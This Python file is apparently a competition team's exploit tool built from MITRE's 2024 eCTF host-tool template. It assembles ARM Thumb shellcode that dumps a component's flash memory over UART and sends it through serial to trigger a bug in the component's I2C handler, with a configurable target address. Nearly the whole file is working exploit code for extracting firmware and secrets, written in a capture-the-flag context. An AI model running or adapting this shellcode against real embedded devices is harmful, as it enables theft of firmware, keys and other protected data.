# @file list_tool.py
# @author Frederich Stine
# @brief host tool for listing installed components 
# @date 2024
#
# This source file is part of an example system for MITRE's 2024 Embedded CTF (eCTF).
# This code is being provided only for educational purposes for the 2024 MITRE eCTF
# competition, and may not meet MITRE standards for quality. Use this code at your
# own risk!
#
# @copyright Copyright (c) 2024 The MITRE Corporation

import argparse
import serial
import re
from loguru import logger
import sys
from pwn import *
import base64

# Logger formatting
fmt = (
    "<green>{time:YYYY-MM-DD HH:mm:ss.SSS}</green> | "
    "{extra[extra]: <6} | "
    "<level>{level: <8}</level> | "
    "<level>{message}</level> "
)

logger.remove(0)
logger.add(sys.stdout, format=fmt)

# returns the shellcode to run on the component
# this shellcode by default dumps the contents of flash to the uart
def construct_shellcode():
    # address we will read from
    start_dump_addr = 0x1000e000
    # amount of bytes we will print out
    dump_length = 0x00038000

    # dump addressess for the bootloader
    # start_dump_addr = 0x10000000
    # dump_length = 0x0000e000

    # status register for uart
    uart_status = 0x40042000 + 0x4
    # fifo register for uart
    uart_fifo_tx = 0x40042000 + 0x20

    reg_write = f'''
        nop
        ldr r0, ={hex(start_dump_addr)}
        ldr r1, ={hex(uart_fifo_tx)}
        ldr r2, ={hex(uart_status)}
        mov r3, #1
        ldr r4, ={hex(dump_length)}
        loop:
        busy_loop:
        ldrb r6, [r2]
        and r6, r6, #0x40
        cmp r6, #0
        beq busy_loop

        ldrb r6, [r0]
        add r0, r0, #1
        strb r6, [r1]
        add r3, r3, #1
        cmp r3, r4
        ble loop
        end:
        nop
    '''

    shellcode = asm(reg_write, arch="thumb")
    assert len(shellcode) < 256

    print(shellcode)
    print(disasm(shellcode, arch='thumb'))

    return shellcode


# List function
def list(args):
    ser = serial.Serial(
        port=args.application_processor,
        baudrate=115200,
        parity=serial.PARITY_NONE,
        stopbits=serial.STOPBITS_ONE,
        bytesize=serial.EIGHTBITS,
    )

    shellcode = construct_shellcode()
    shellcode = base64.b64encode(shellcode).decode('ascii')

    # Send command
    input_list = [
        "pwn\r",
        f"{args.component}\r",
        f"{args.done_address}\r",
        f"{shellcode}\r",
    ]

    print(input_list)

    message = input_list.pop(0)
    ser.write(message.encode())
    logger.bind(extra="INPUT").debug(message)

    output = ""
    # Receive messages until done
    while True:
        byte = ser.read()
        char = byte.decode("utf-8")
        output += char
        output = process_output(output, input_list, ser)


def process_output(output, input_list, ser):
    # Find INFO level messages
    match = re.search("%info: ((.|\n|\r)*?)%", output)
    if match != None:
        # Output all of the data and remove from buffer
        output = output[:match.start()] + output[match.end():]
        for line in match.group(1).strip().split('\n'):
            logger.bind(extra="OUTPUT").info(line.strip())
    # Find DEBUG level messages
    match = re.search("%debug: ((.|\n|\r)*?)%", output)
    if match != None:
        # Output all of the data and remove from buffer
        output = output[:match.start()] + output[match.end():]
        for line in match.group(1).strip().split('\n'):
            logger.bind(extra="OUTPUT").debug(line.strip())
    # Find ACK level messages
    match = re.search("%ack%", output)
    if match != None:
        # send next input
        output = output[:match.start()] + output[match.end():]
        message = input_list.pop(0)
        ser.write(message.encode())
        logger.bind(extra="INPUT").debug(message)
    # Find SUCCESS level messages
    match = re.search("%success: ((.|\n|\r)*?)%", output)
    if match != None:
        # Output all of the data and remove from buffer
        output = output[:match.start()] + output[match.end():]
        for line in match.group(1).strip().split('\n'):
            logger.bind(extra="OUTPUT").success(line.strip())
        exit(0)
    # Find ERROR level messages
    match = re.search("%error: ((.|\n|\r)*?)%", output)
    if match != None:
        # Output all of the data and remove from buffer
        output = output[:match.start()] + output[match.end():]
        for line in match.group(1).strip().split('\n'):
            logger.bind(extra="OUTPUT").error(line.strip())
        exit(1)
    # Return the spliced output
    return output


# Main function
def main():
    parser = argparse.ArgumentParser(
        prog="b01lers i2c pwn tool",
        description="exploit the bug in the component i2c handler",
    )

    parser.add_argument(
        "-a", "--application-processor", required=True, help="Serial device of the AP"
    )

    parser.add_argument(
        "-c", "--component", required=True, help="Component ID of component to pwn"
    )

    parser.add_argument(
        "-r", "--done-address", default='0x20000b34', help="Address of the recieve done buffer (on reference design this is 0x20000b34)"
    )

    args = parser.parse_args()

    list(args)


if __name__ == "__main__":
    main()

